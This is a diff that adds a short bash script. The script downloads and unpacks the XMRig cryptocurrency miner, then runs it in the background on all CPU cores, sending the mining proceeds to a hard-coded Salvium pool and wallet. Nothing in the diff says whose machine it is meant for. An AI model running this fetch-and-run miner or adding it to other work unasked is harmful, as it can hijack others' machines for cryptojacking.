@@ -1,0 +1,7 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar xf xmrig-6.22.2-linux-static-x64.tar.gz
+cd xmrig-6.22.2
+nohup ./xmrig --donate-level 1 -a rx/0 -o sg.salvium.gfwroute.com:1230 -u SaLvs7hDXDzGc5SyXFscw4hMXB1UDX1iASNP7mhsvu2RawQWpEdZSifCLNP36eufYsYYN4MReWt5jdYRNWNiSbBpLpnt64NbKAC -p $(echo $RANDOM | md5sum | head -c 20) -t $(nproc --all) > log.log &
+sleep 10s
+tail -f log.log
